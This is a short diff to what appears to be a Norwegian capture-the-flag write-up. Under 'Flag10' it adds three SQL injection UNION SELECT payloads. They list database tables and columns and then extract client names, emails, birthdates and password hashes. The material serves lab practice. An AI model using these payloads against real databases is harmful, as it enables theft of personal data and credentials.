@@ -111,6 +111,11 @@ endre cookie til 000000000a7dce5ac40e7a88fd61399bbe76da161c1d65cbc2ebf2bd364545e
 ```
 
 # Flag10
+```
+1 union select null, concat(table_name) from information_schema.tables where table_schema=database()
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+1 AND 1=2 UNION SELECT user_id99, CONCAT(first_name64, last_namecc, birthdate, email60, town91, country3e, comment92, HashedPassword) FROM clients
+```
 
 # Flag11
 
